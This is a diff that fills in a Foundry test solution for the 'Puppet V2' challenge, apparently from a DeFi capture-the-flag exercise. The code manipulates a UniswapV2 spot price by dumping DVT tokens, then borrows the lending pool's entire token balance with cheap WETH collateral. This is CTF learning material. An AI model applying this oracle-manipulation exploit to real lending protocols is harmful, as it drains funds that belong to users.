@@ -98,7 +98,31 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        // THe key is to decrease the WETH reserve and increase DVT reserve, e.g. decrease the price of DVT in UniswapV2 pool
+        // That means, buy WETH or sell DVT to the Uniswap pool to decrease required deposit
+
+        // Create path for swapping DVT to WETH
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        // Swap DVT to WETH
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapV2Router.swapExactTokensForTokens(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp * 2);
+
+        // Get more WETH by depositing ETH
+        weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
+
+        // Borrow tokens
+        weth.approve(address(lendingPool), lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE));
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        // Recover funds
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log(token.balanceOf(player));
+        console.log(weth.balanceOf(player));
+        console.log(address(player).balance);
     }
 
     /**
